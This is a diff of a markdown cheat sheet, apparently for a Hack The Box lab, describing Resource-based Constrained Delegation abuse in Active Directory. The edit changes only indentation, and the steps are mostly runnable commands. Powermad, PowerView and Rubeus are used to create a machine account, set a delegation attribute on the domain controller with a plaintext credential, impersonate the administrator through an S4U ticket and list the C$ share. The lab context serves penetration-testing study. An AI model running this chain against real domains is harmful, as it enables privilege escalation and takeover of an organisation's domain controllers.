@@ -46,35 +46,35 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
   Import-Module .\Powermad.ps1
   New-MachineAccount -MachineAccount <FakeMachineName> -Password $(ConvertTo-SecureString "<password>" -AsPlainText -Force)
   ```
-  4. Modify the target computers
-    ```powershell
-    Import-Module .\Powerview.ps1
-    $ComputerSid = Get-DomainComputer <FakeMachineName> -Properties objectsid | Select -Expand objectsid
-    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-    $SDBytes = New-Object byte[] ($SD.BinaryLength)
-    $SD.GetBinaryForm($SDBytes, 0)
-    $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
-    Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
-    ```
-  5. Get Computer hashes with Rubeus
-    ```powershell
-    .\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
-    ```
-  6. s4u to Impersonate the Administrator
-    ```powershell
-    .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
-    ```
+4. Modify the target computers
+  ```powershell
+  Import-Module .\Powerview.ps1
+  $ComputerSid = Get-DomainComputer <FakeMachineName> -Properties objectsid | Select -Expand objectsid
+  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+  $SDBytes = New-Object byte[] ($SD.BinaryLength)
+  $SD.GetBinaryForm($SDBytes, 0)
+  $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+  Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
+  ```
+5. Get Computer hashes with Rubeus
+  ```powershell
+  .\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
+  ```
+6. s4u to Impersonate the Administrator
+  ```powershell
+  .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
+  ```
     `Note: We can also use /altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm to include aditional services to our ticket request.`
-  7. Connec to the target Machine 
-    ```powershell
-    ls \\dc01.inlanefreight.local\c$
-    ```
-  8. Clean up 
-    ```powershell
-    Import-Module .\PowerView.ps1
-    $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
-    Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
-    ```
+7. Connec to the target Machine 
+  ```powershell
+  ls \\dc01.inlanefreight.local\c$
+  ```
+8. Clean up 
+  ```powershell
+  Import-Module .\PowerView.ps1
+  $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+  Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
+  ```
 
 ## Swisskey Method 
 
